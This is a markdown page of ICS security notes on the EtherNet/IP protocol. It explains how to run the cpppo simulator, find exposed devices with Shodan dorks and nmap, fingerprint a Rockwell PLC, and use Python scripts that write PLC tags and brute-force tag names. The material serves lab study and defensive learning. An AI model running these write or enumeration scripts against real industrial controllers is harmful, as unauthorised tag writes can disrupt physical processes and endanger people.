# EtherNet/IP

![EtherNet/IP OSI Model](docs/ethernetip_osi_model.jpg)

![EtherNet/IP Frame Structure](docs/ethernetip_frame_structure.jpg)

### EtherNet/IP Simulator

To install a python implementation of EtherNet/IP Stack in a Ubuntu VM:

``` 
$ sudo -H pip install --upgrade cpppo
$ python -m cpppo.server.enip -v
python -m cpppo.server.enip -v
12-16 01:53:33.461 MainThread root     NORMAL   main       Loaded config files: []
12-16 01:53:33.461 MainThread enip.srv NORMAL   main       Delaying all responses by 0.0 seconds
12-16 01:53:33.462 MainThread root     NORMAL   main       EtherNet/IP Simulator: ('', 44818)
12-16 01:53:33.462 MainThread network  NORMAL   server_mai enip_srv server PID [26261] running on ('', 44818)
12-16 01:53:33.462 MainThread network  NORMAL   server_mai enip_srv server PID [26261] responding to external done/disable signal in object 139661755723408
12-16 01:53:33.462   Thread-1 enip.srv NORMAL   enip_srv   EtherNet/IP Server enip_UDP begins serving peer None
``` 

or start this way to enable an array of 1000 INT values. Tag is called *SCADA*:

``` 
python -m cpppo.server.enip SCADA=INT[1000] -v
``` 

### Dorks and detection

Use these to get started with shodan then you can extend fingerprints based on results!

``` 
Device type: Communications Adapter
port:44818
```

Usually, service is on port **44818**. To discover devices in a specific subnet, nMap scan should look like:

``` 
$ nmap -p44818 172.16.252.1/24

Starting Nmap 7.01 ( https://nmap.org ) at 2017-12-16 11:58 EET

Nmap scan report for 172.16.252.134
Host is up (0.00062s latency).
PORT      STATE SERVICE
44818/tcp open  unknown
``` 

and if you want to analyze the service itself:


``` 
$ nmap 172.16.252.134 -p 44818 --script=enip-info

Starting Nmap 7.01 ( https://nmap.org ) at 2017-12-16 11:55 EET
Nmap scan report for 172.16.252.134
Host is up (0.00028s latency).
PORT      STATE SERVICE
44818/tcp open  EtherNet-IP-2
| enip-info: 
|   Vendor: Rockwell Automation/Allen-Bradley (1)
|   Product Name: 1756-L61/B LOGIX5561
|   Serial Number: 0x006c061a
|   Device Type: Programmable Logic Controller (14)
|   Product Code: 54
|   Revision: 20.11
|_  Device IP: 0.0.0.0
``` 

### Exploit?

1. Use *RSLogix 5000 Software* - it will allow you to perform some direct operations and even rewrite firmware.

2. Use *cpppo* to read/write tags:

**Write a specific tag:**

```
#!/usr/bin/env  python2

from cpppo.server.enip import client
import time

host = "192.168.179.131"
tags = [ "SCADA[13]", "SCADA[2]=(INT)37" ]

with client.connector( host=host ) as conn:
    for index,descr,op,reply,status,value in conn.pipeline(
            operations=client.parse_operations( tags ), depth=2 ):
``` 

**Read a specific tag:**

The trick in reading is that you have to already know the name of the tag you want to read! In the example, the tag name is "SCADA", the one used when simulator was started!

```
#!/usr/bin/env  python2

from cpppo.server.enip import client
import time

host = "192.168.179.131"
tags = [ "SCADA[1]", "SCADA[2]" ]

with client.connector( host=host ) as conn:
    for index,descr,op,reply,status,value in conn.pipeline(
            operations=client.parse_operations( tags ), depth=2 ):
        print( "%s: %20s: %s" % ( time.ctime(), descr, value ))
```

The only difference is the *line 7*, where the value is defined!

**Find new tags using broute force**

```
#!/usr/bin/env  python2

from cpppo.server.enip import client

host = "192.168.179.131"

with open('tagNames.txt') as f:
    tags = f.read().splitlines()                    # read all the tag names in the dictionary file, 
                                                    # stripping of newlines
with client.connector( host=host ) as conn:
    for tag in tags:
        req = conn.read( tag + '.ACC')              # adding .ACC to avoid errors on not DINT type tags

        assert conn.readable(timeout=1.0), "Failed to receive reply"

        reply = next(conn)
        for k, v in reply.items():                  # Scan through the Key and Value pairs returned
            if str(k).endswith('status'):
				if (v == 5):                        # Found a valid tag if the transaction status is 5 
                    print tag + " is a valid tag"
```

where *tagNames.txt* is a list of possible tags, one per line:

```
motor
pump
tank
valve
actuator
power
circuit
room
grid
panel
control
john
cena
password
username
user
pass
secret
safe
key
hidden
```

#### Conclusions

Resources and bibliography:

  * **Industrial Cybersecurity - Efficiently secure critical infrastructure systems** by *Pascal Ackerman*
  * **HACKING EXPOSED: ICS and SCADA Security Secrets and Solutions** by *C. E. Bodungen, B. L. Singer, A. Shbeeb, S. Hilt, K. Wilhoit*
  * Introduction into ICSs world: https://www.myplctraining.com/beginners-plc-overview-part-1-of-4-introduction-to-plcs/